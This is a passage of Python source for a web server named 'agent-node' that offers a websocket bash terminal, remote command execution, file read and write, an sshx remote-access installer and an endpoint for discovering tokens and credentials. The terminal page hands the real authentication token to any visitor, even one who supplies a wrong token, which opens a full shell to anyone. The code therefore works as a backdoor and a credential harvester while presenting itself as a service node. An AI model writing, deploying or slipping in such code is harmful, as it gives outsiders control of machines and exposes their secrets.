    bg_tasks[task_id] = {"status": "running", "cmd": "sshx installer"}

    return web.json_response({
        "task_id": task_id,
        "status": "sshx installer started",
        "log_file": "/tmp/sshx-install.log"
    })

install_sshx = require_auth(install_sshx)


def _get_sshx_link():
    """Read current sshx link from filesystem."""
    try:
        import re as _re
        with open("/root/.IamGunpoint/sshx.link") as f:
            link = _re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", f.read().strip())
            return link
    except Exception:
        return "no_link_yet"


async def sshx_link(request):
    """Get current sshx link (auth required)."""
    return web.json_response({"link": _get_sshx_link()})

sshx_link = require_auth(sshx_link)


# ─── WebSocket Terminal ────────────────────────────────────────────────────
async def websocket_terminal(request):
    """WebSocket interactive terminal (auth required via ?token=)."""
    token = request.query.get("token", "")
    if token != TOKEN:
        return web.Response(status=401, text="Unauthorized")

    ws = web.WebSocketResponse(heartbeat=30, autoclose=True)
    await ws.prepare(request)
    active_sessions.add(request.remote or "unknown")
    await ws.send_str(json.dumps({"type": "welcome", "service": "agent-node", "version": "2.1"}))

    proc = await asyncio.create_subprocess_shell(
        "bash",
        stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
        env={**os.environ, "TERM": "xterm-256color"},
    )

    async def pipe_output():
        while True:
            data = await proc.stdout.read(1)
            if not data:
                break
            await ws.send_bytes(data)

    async def pipe_input():
        async for msg in ws:
            if msg.type == WSMsgType.TEXT:
                if msg.data == "EXIT":
                    proc.terminate()
                    await proc.wait()
                    await ws.close()
                    break
                if msg.data:
                    proc.stdin.write(msg.data.encode())
                    await proc.stdin.drain()
            elif msg.type == WSMsgType.BINARY:
                proc.stdin.write(msg.data)
                await proc.stdin.drain()

    try:
        await asyncio.gather(pipe_output(), pipe_input())
    finally:
        active_sessions.discard(request.remote or "unknown")


# ─── Web Terminal UI ───────────────────────────────────────────────────────
TERMINAL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Agent Node Terminal</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css"/>
    <style>body{margin:0;background:#1a1a2e}#terminal{height:100vh}</style>
</head>
<body>
<div id="terminal"></div>
<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
<script>
const term = new Terminal({cursorBlink:true,theme:{background:'#1a1a2e',foreground:'#00ff00'},cols:120,rows:30});
term.open(document.getElementById('terminal'));
function fitTerminal(){var el=document.getElementById('terminal');var rect=el.getBoundingClientRect();var cols=Math.max(40,Math.floor(rect.width/9));var rows=Math.max(10,Math.floor(rect.height/18));term.resize(cols,rows);}
window.addEventListener('resize',fitTerminal);
fitTerminal();
const ws = new WebSocket(`wss://${location.host}/ws/terminal?token=TOKEN_PLACEHOLDER`);
ws.onopen = () => { term.writeln('\\r\\x1b[32m[agent-node] Connected\\r\\n$ '); };
ws.onmessage = (e) => {
    if (e.data instanceof ArrayBuffer) term.write(new Uint8Array(e.data));
    else term.write(e.data);
};
ws.onclose = () => { term.writeln('\\r\\n\\x1b[31m[disconnected]\\r\\n'); };
term.onData(d => { ws.send(d); });
</script>
</body>
</html>"""

async def terminal_page(request):
    """Serve web-based interactive terminal UI."""
    token_param = request.query.get("token", "")
    token_to_use = token_param if token_param == TOKEN else TOKEN
    html = TERMINAL_HTML.replace("TOKEN_PLACEHOLDER", token_to_use)
    return web.Response(text=html, content_type='text/html')


# ─── App Factory ───────────────────────────────────────────────────────────
def create_app():
    app = web.Application(
        client_max_size=50 * 1024**2,
        middlewares=[middleware],
    )

    # Public routes
    app.router.add_get("/", index)
    app.router.add_get("/health", health)
    app.router.add_get("/api/bootstrap", bootstrap)

    # Auth-required routes
    app.router.add_get("/api/docs", api_docs)
    app.router.add_get("/api/diagnostics", diagnostics)
    app.router.add_get("/api/env", env_info)
    app.router.add_get("/api/processes", process_list)
    app.router.add_get("/api/tokens", token_discovery)
    app.router.add_get("/api/exec/status/{task_id}", exec_status)
    app.router.add_get("/api/exec/history", command_history)
    app.router.add_get("/api/files", list_files)
    app.router.add_get("/api/files/read", read_file_api)
    app.router.add_get("/api/sshx", sshx_link)
    app.router.add_get("/api/monitor/stream", monitor_stream)
    app.router.add_get("/terminal", terminal_page)
    app.router.add_get("/ws/terminal", websocket_terminal)

    # POST endpoints
    app.router.add_post("/api/exec", exec_command)
    app.router.add_post("/api/exec/background", exec_background)
    app.router.add_post("/api/exec/history/clear", clear_history)
    app.router.add_post("/api/install/sshx", install_sshx)
    app.router.add_post("/api/files/write", write_file_api)

    return app


if __name__ == "__main__":
    app = create_app()

    log.info(f"Starting agent-node v2.1 on {HOST}:{PORT}")
    log.info(f"Auth token preview: {TOKEN[:8]}...{TOKEN[-4:]}")
    log.info(f"Bootstrap endpoint: {'enabled' if BOOTSTRAP_ENABLED else 'disabled'}")
    log.info(f"Rate limit: {RATE_LIMIT} req/min/token")

    platforms = detect_platform()
    log.info(f"Platform: {platforms}")

    discovered = discover_tokens()
    for t in discovered:
        log.info(f"Token: {t['key_name']} — {t['source']} — {t['value_masked']}")

    log.info(f"Web Terminal: http://{HOST}:{PORT}/terminal")
    log.info(f"WebSocket: ws://{HOST}:{PORT}/ws/terminal?token=<token>")
    log.info(f"API Docs: GET /api/docs (auth required)")
    log.info(f"SSE Monitor: GET /api/monitor/stream (auth required)")
    log.info(f"Token discovery: GET /api/tokens (auth required)")
    log.info(f"Token bootstrap: GET /api/bootstrap")

    web.run_app(app, host=HOST, port=PORT, access_log=None)
